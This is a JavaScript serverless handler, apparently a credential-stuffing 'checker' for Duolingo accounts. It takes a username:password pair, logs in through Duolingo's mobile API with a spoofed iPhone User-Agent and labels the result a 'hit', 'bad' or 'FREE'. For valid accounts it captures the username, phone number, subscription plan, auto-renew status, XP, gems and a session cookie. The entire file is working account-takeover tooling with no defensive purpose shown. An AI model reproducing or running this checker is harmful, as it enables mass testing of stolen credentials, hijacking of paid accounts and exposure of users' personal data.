const axios = require("axios");
const crypto = require("crypto");

module.exports = async (req, res) => {
  try {
    const account = req.query.account;
    if (!account || !account.includes(":")) {
      return res.status(400).json({ error: "Format: user:pass" });
    }

    const [username, password] = account.split(":");
    const distinctId = crypto.randomBytes(16).toString("hex");

    const response = await axios.post(
      "https://ios-api-2.duolingo.com/2023-05-23/login",
      {
        password,
        distinctId,
        identifier: username,
        fields:
          "username,productId,level,phoneNumber,totalXp,gems,num_followers,renewing,tier,currentCourse,shopItems",
      },
      {
        headers: {
          "Content-Type": "application/json",
          "User-Agent":
            "DuolingoMobile/7.41.0 (iPhone; iOS 18.0; Scale/2.00)",
          "Accept-Language": "en-IQ;q=1.0,ar-IQ;q=0.9,ckb-IQ;q=0.8",
        },
        validateStatus: () => true,
      }
    );

    const data = response.data || {};
    const cookies = response.headers["set-cookie"] || [];
    const cookieStr = cookies.join("; ");

    const captured = {};

    
    if (JSON.stringify(data).trim() === "{}") {
      return res.json({ result: "bad", captured });
    }

    
    if (data.currentCourse && cookieStr.includes("jwt_token")) {
      captured["İsim"] = data.username || null;

      
      const productId =
        data?.shopItems?.[0]?.subscriptionInfo?.productId;
      captured["Plan type"] = translatePlan(productId);

      if (data.level) captured["Seviye"] = data.level + " Seviye";
      if (data.phoneNumber) captured["Telefon"] = data.phoneNumber;
      if (data.totalXp) captured["Toplam XP"] = data.totalXp + " XP";
      if (data.gems) captured["Toplam Elmas"] = data.gems + " Elmas";
      if (data.num_followers)
        captured["Takipçi"] = data.num_followers + " Takipçi";

      const renewing =
        data?.shopItems?.[0]?.subscriptionInfo?.renewing;
      captured["Auto renew"] = renewing ? "YES" : "NO";

      const tier =
        data?.shopItems?.[0]?.subscriptionInfo?.tier;
      if (tier === "one_month") captured["Period of Plan"] = "1 month";

      
      const wuuidCookie = cookies.find((c) =>
        c.startsWith("wuuid=")
      );
      if (wuuidCookie) {
        captured["wuuid"] = wuuidCookie.split("=")[1].split(";")[0];
      }

      return res.json({
        result: "hit",
        captured,
      });
    }

    
    const typeVal =
      data?.shopItems?.[0]?.subscriptionInfo?.type;
    if (typeVal && !typeVal.includes("premium")) {
      return res.json({
        result: "custom",
        label: "FREE",
        captured,
      });
    }

    return res.json({ result: "bad", captured });
  } catch (err) {
    console.error("FUNCTION ERROR:", err);
    return res.status(500).json({ error: err.message });
  }
};


function translatePlan(productId) {
  switch (productId) {
    case "com.duolingo.DuolingoMobile.subscription.Premium.TwelveMonth.24":
      return "Mobile Plan";
    case "com.duolingo.immersive_free_trial_family_subscription":
      return "Family Plan";
    case "super.2ndwbt7.12m.24q47dft.8399":
    case "super.wbt7.12m.24q47dft.8399":
      return "Super Plan";
    default:
      return productId || null;
  }
}

